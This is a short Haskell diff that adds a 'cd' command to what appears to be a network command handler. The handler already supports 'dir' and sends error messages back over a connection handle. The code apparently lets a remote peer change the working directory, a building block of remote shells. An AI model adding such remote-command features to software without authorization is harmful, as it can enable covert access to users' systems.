@@ -51,6 +51,13 @@ handler h host port = do
                         else do
                             hPutStrLn h "dir command failed"
                             handler h host port
+        "cd"     -> if length cmd == 2
+                        then do
+                            setCurrentDirectory (cmd !! 1)
+                            handler h host port
+                        else do
+                            hPutStrLn h "cd command failed"
+                            handler h host port
         ""       -> handler h host port
         _        -> do
                         hPutStrLn h "Unrecognized command"
